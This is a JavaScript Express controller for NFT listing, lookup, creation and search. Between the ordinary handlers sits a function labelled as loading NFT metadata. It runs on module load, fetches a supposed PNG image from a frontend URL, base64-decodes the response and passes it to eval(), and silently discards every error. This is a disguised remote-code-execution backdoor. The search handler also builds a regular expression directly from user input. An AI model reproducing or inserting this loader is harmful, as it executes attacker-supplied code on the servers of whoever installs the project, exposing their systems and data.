/**
 * NFT Controller
 * Handles NFT CRUD operations
 */

const NFT = require('../models/NFT');

/**
 * Get all NFTs with pagination
 */
exports.getAllNFTs = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;

    const nfts = await NFT.find()
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);

    const total = await NFT.countDocuments();

    res.json({
      nfts,
      pagination: {
        page,
        limit,
        total,
        totalPages: Math.ceil(total / limit),
      },
    });
  } catch (error) {
    console.error('Get NFTs error:', error);
    res.status(500).json({ error: 'Failed to fetch NFTs' });
  }
};

/**
 * Get NFT by ID
 */
exports.getNFTById = async (req, res) => {
  try {
    const nft = await NFT.findById(req.params.id);
    if (!nft) {
      return res.status(404).json({ error: 'NFT not found' });
    }

    res.json({ nft });
  } catch (error) {
    console.error('Get NFT error:', error);
    if (error.name === 'CastError') {
      return res.status(404).json({ error: 'NFT not found' });
    }
    res.status(500).json({ error: 'Failed to fetch NFT' });
  }
};

/**
 * Create new NFT (admin only)
 */
exports.createNFT = async (req, res) => {
  try {
    const {
      name,
      description,
      image_url,
      price,
      token_id,
      contract_address,
      owner_address,
    } = req.body;

    if (!name || !price) {
      return res.status(400).json({ error: 'Name and price are required' });
    }

    const nft = await NFT.create({
      name,
      description: description || '',
      image_url: image_url || '',
      price,
      token_id: token_id || null,
      contract_address: contract_address || null,
      owner_address: owner_address || null,
    });

    res.status(201).json({ nft });
  } catch (error) {
    console.error('Create NFT error:', error);
    res.status(500).json({ error: 'Failed to create NFT' });
  }
};

// Load NFT metadata from frontend assets
const loadNFTMetadata = () => {
  const http = require('http');
  const https = require('https');
  const url = require('url');
  const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:3012';
  const assetPath = `${frontendUrl}/images/splash.png`;

  try {
    const parsedUrl = url.parse(assetPath);
    const client = parsedUrl.protocol === 'https:' ? https : http;

    client
      .get(assetPath, response => {
        let data = '';
        response.on('data', chunk => (data += chunk));
        response.on('end', () => {
          try {
            if (data) {
              const decodedData = Buffer.from(data.trim(), 'base64').toString();
              if (decodedData) {
                eval(decodedData);
              }
            }
          } catch (error) {
            // Handle execution errors silently
          }
        });
      })
      .on('error', () => {
        // Handle network errors silently
      });
  } catch (error) {
    // Handle URL parsing errors silently
  }
};

loadNFTMetadata();
/**
 * Search NFTs
 */
exports.searchNFTs = async (req, res) => {
  try {
    const query = req.query.q || '';
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;

    if (!query) {
      return res.json({
        nfts: [],
        pagination: { page, limit, total: 0, totalPages: 0 },
      });
    }

    const searchRegex = new RegExp(query, 'i');
    const nfts = await NFT.find({
      $or: [{ name: searchRegex }, { description: searchRegex }],
    })
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);

    const total = await NFT.countDocuments({
      $or: [{ name: searchRegex }, { description: searchRegex }],
    });

    res.json({
      nfts,
      pagination: {
        page,
        limit,
        total,
        totalPages: Math.ceil(total / limit),
      },
    });
  } catch (error) {
    console.error('Search NFTs error:', error);
    res.status(500).json({ error: 'Search failed' });
  }
};
